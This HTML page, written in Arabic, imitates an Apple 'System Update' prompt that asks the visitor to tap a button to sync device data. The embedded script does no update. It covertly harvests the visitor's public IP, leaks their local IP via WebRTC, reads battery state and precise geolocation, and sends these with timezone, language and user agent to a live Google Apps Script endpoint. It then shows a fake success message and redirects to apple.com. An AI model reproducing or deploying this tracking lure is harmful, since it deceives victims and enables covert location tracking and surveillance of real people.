<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>System Update</title>
<style>
  body { margin:0; padding:16px; background:#f2f2f7;
         font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
         display:flex; justify-content:center; align-items:center; min-height:100dvh; box-sizing:border-box; }
  .container { text-align:center; background:#fff; padding:30px; border-radius:16px;
               box-shadow:0 10px 25px rgba(0,0,0,.1); width:100%; max-width:320px; }
  h2 { color:#1c1c1e; margin-top:0; font-size:20px; }
  p  { color:#8e8e93; font-size:14px; margin-bottom:25px; line-height:1.6; }
  button { background:#007aff; color:#fff; border:none; padding:14px 0; width:100%;
           border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:.2s; }
  button:active { transform:scale(.98); opacity:.9; }
  button[disabled] { opacity:.6; cursor:default; }
  .loader { border:3px solid #f3f3f3; border-top:3px solid #007aff; border-radius:50%;
            width:24px; height:24px; animation:spin 1s linear infinite; margin:20px auto; display:none; }
  @keyframes spin { to { transform:rotate(360deg); } }
  #status { display:none; margin-top:15px; font-weight:700; font-size:14px; line-height:1.5; }
  #status.ok  { color:#34c759; display:block; }
  #status.err { color:#ff3b30; display:block; }
</style>
</head>
<body>

<div class="container">
  <h2>تحديث النظام مطلوب</h2>
  <p>يرجى الضغط على الزر التالي لمزامنة بيانات الجهاز وتحديث الإعدادات.</p>

  <button id="btn" type="button">تحديث الآن</button>

  <div class="loader" id="loader"></div>
  <div id="status" role="status" aria-live="polite"></div>
</div>

<script>
  /* ====== إعدادات ====== */
  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzRHwp6FjL0OkvyVytym3BGvh0glHdc4M24yPqWzRyeb4sQYs1pniOB4jw2WXxJwTggSg/exec';
  const REDIRECT_URL      = 'https://www.apple.com';
  const ONCE_PER_VISITOR  = true;   // اجعلها false للتسجيل في كل زيارة
  const TIMEOUT           = 5000;
  const GEO_TIMEOUT       = 10000;

  const withTimeout = (p, ms, fallback) =>
    Promise.race([p, new Promise(r => setTimeout(() => r(fallback), ms))]);

  async function getIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
      const d = await res.json();
      return d.ip || 'N/A';
    } catch { return 'N/A'; }
  }

  function getWebRTC() {
    const p = new Promise(resolve => {
      if (!window.RTCPeerConnection) return resolve('N/A');
      let done = false;
      const finish = v => { if (!done) { done = true; resolve(v); } };

      let pc;
      try {
        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
      } catch { return finish('N/A'); }

      pc.onicecandidate = e => {
        if (e.candidate) return;
        const sdp = pc.localDescription ? pc.localDescription.sdp : '';
        finish((sdp.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/) || [])[0] || 'N/A');
        try { pc.close(); } catch {}
      };

      try {
        pc.createDataChannel('x');
        pc.createOffer()
          .then(o => pc.setLocalDescription(o))
          .catch(() => finish('N/A'));
      } catch { finish('N/A'); }
    });
    return withTimeout(p, TIMEOUT, 'N/A');
  }

  async function getBattery() {
    if (!navigator.getBattery) return 'N/A';
    try {
      const b = await navigator.getBattery();
      return Math.round(b.level * 100) + '%' + (b.charging ? ' (يشحن)' : '');
    } catch { return 'N/A'; }
  }

  function getGeo() {
    const p = new Promise(resolve => {
      if (!navigator.geolocation) return resolve('N/A');
      navigator.geolocation.getCurrentPosition(
        pos => resolve(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`),
        err => resolve(err.code === 1 ? 'Denied' : 'N/A'),
        { enableHighAccuracy: false, timeout: GEO_TIMEOUT, maximumAge: 60000 }
      );
    });
    return withTimeout(p, GEO_TIMEOUT + 500, 'N/A');
  }

  let busy = false;

  async function startTracking() {
    if (busy) return;

    const btn    = document.getElementById('btn');
    const loader = document.getElementById('loader');
    const status = document.getElementById('status');

    if (ONCE_PER_VISITOR) {
      try {
        if (localStorage.getItem('su_done') === '1') {
          status.className = 'ok';
          status.textContent = '✅ تم التحديث مسبقًا على هذا الجهاز';
          setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
          return;
        }
      } catch {}
    }

    busy = true;
    btn.disabled = true;
    btn.style.display = 'none';
    loader.style.display = 'block';
    status.className = '';
    status.textContent = '';

    try {
      // getGeo يُستدعى فورًا داخل Promise.all ليحافظ على نقرة المستخدم على iOS
      const [ip, localIP, battery, geo] = await Promise.all([
        getIP(), getWebRTC(), getBattery(), getGeo()
      ]);

      const payload = {
        time: new Date().toISOString(),
        ip,
        localIP,
        battery,
        location: geo,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
        lang: navigator.language || '',
        ua: navigator.userAgent
      };

      await fetch(GOOGLE_SCRIPT_URL, {
        method: 'POST',
        mode: 'no-cors',
        keepalive: true,
        headers: { 'Content-Type': 'text/plain;charset=UTF-8' },
        body: JSON.stringify(payload)
      });

      try { localStorage.setItem('su_done', '1'); } catch {}

      loader.style.display = 'none';
      status.className = 'ok';
      status.textContent = '✅ تم التحديث بنجاح';
      setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);

    } catch (err) {
      console.error(err);
      loader.style.display = 'none';
      status.className = 'err';
      status.textContent = '⚠️ تعذر الإرسال، تحقق من الاتصال وحاول مجددًا';
      btn.disabled = false;
      btn.style.display = 'block';
      busy = false;
    }
  }

  document.getElementById('btn').addEventListener('click', startTracking);
</script>

</body>
</html>
